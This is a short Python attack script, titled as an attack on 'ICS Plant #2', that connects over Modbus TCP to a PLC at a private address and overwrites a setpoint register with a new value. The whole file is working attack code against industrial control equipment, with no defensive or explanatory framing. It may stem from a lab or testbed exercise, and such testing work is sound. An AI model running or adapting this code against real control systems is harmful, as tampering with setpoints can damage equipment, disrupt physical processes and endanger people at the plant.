#!/usr/bin/env python3
# Attack: Change Setpoints – ICS Plant #2

from pymodbus.client.sync import ModbusTcpClient

PLC = "192.168.100.10"
SETPOINT_REGISTER = 3

client = ModbusTcpClient(PLC)

print(f"[!] Changing setpoint on PLC {PLC}")

if client.connect():
    try:
        new_value = 1200
        client.write_register(SETPOINT_REGISTER, new_value)
        print(f"[!] Setpoint changed to {new_value}")
    except Exception as e:
        print("[-] Error:", e)

    client.close()
else:
    print("[-] Connection failed")
